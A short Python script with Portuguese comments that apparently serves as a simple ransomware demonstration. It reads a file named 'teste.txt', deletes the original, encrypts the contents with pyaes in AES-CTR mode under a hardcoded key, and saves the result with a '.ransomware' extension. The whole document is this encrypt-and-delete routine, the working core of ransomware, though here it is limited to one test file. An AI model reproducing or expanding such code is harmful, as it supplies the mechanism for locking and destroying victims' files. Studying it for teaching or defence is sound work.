import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# removedor de arquivo
os.remove(file_name)

# chave para criptografar
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografia de arquivo
crypto_data = aes.encrypt(file_data)

# salvando o arquivoque foi criptografado
new_file = file_name + ".ransomware"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()